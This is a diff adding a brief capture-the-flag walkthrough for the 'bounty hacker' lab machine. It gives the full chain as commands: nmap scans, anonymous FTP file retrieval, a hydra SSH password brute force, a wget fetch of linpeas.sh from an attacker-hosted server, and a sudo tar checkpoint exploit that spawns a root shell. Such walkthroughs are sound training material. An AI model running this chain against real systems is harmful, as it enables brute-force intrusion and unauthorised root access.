@@ -1,0 +1,61 @@
+Hello
+
+--step 1
+
+first of all scanning the machine(bounty hacker) with nmap
+- nmap <ip_bounty_hacker>
+output:
+- ssh
+- http
+- ftp
+
+When I was checking a port 21(ftp) using nmap I found anonymous login
+- nmap -p21 -sV -A <ip_bounty_hacker>
+
+login ftp
+- ftp <ip_bounty_hacker>
+
+- dir
+i have found locks.txt and task.txt
+- get locks.txt
+- get task.txt
+
+attacker machine 
+
+cat task.txt
+
+cat locks.txt
+
+hydra -l lin -P locks.txt ssh://ip_bounty_hacker
+
+output:
+user and password
+
+i got user lin from tasks.txt and passwords from locks.txt
+
+login ssh by user and password
+
+Gaining access
+
+-- step 2
+
+privilege escalation
+
+file transfer (linpeas.sh)
+
+- attacker machine run command: 
+- python -m SimpleHTTPServer 3333
+
+bounty_hacker machine run command
+- wget http://ip_attacker:3333/linpeas.sh
+
+run linpeas.sh 
+
+- bash linbeas.sh
+
+(root) /bin/tar (privilege escalation)
+
+run command : sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+- whoami
+root
